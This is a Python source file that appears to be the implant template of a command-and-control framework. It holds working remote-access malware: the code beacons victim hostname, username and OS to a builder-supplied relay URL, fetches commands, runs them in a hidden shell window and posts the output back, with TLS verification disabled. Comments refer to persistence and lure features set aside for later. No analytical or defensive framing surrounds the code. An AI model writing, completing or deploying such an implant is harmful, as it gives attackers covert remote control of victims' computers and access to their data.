# payload/template.py (Full Code - Barebones for Maximum Stability)
import sys
import os
import time
import threading
import platform
import base64
import subprocess
import uuid
import requests
import json
import socket
import getpass
import random

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
# Persistence and lure options are ignored in this version for stability
# They can be re-added later once the core connection is proven to be stable.

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
TERMINATE_FLAG = threading.Event()

def _run_command(command):
    """Executes a shell command and returns its output."""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip() if result.stdout else result.stderr.strip()
    except Exception as e:
        return f"Command execution failed: {str(e)}"

def _action_shell(params):
    """Action handler for executing shell commands."""
    command = params.get("command", "")
    return {"status": "success", "data": _run_command(command)}

def execute_command(command_data):
    """Dispatches a command to its corresponding handler function."""
    action = command_data.get('action')
    params = command_data.get('params', {})
    response_id = command_data.get('response_id')
    
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try:
            result = handler_func(params)
        except Exception as e:
            result = {"status": "error", "data": f"Handler for '{action}' failed: {e}"}
    
    # Always send a response back for tasked commands
    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
        except requests.exceptions.RequestException:
            pass # Suppress network errors here

def command_and_control_loop():
    """The main C2 communication loop. Its only job is to beacon and handle tasks."""
    initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system()}
    
    while not TERMINATE_FLAG.is_set():
        try:
            heartbeat_data = {
                "session_id": SESSION_ID,
                "c2_user": C2_USER,
                "hostname": initial_metadata["hostname"],
                "user": initial_metadata["user"],
                "os": initial_metadata["os"]
            }
            
            # The core beacon. verify=False is critical to prevent SSL errors in compiled executables.
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=False)
            
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for cmd in commands:
                    # Execute each command in a new thread to avoid blocking the main C2 loop
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        
        except requests.exceptions.RequestException:
            # If the server is down or unreachable, just wait and try again.
            pass
        except Exception:
            # Catch any other unexpected errors to prevent the loop from crashing.
            pass
            
        time.sleep(random.randint(8, 15))

if __name__ == "__main__":
    # The payload's only job is to start the C2 loop. No persistence, no migration.
    # This maximizes the chance of a successful connection.
    main_c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    main_c2_thread.start()
    
    # Keep the main process alive indefinitely while the C2 thread runs in the background.
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        TERMINATE_FLAG.set()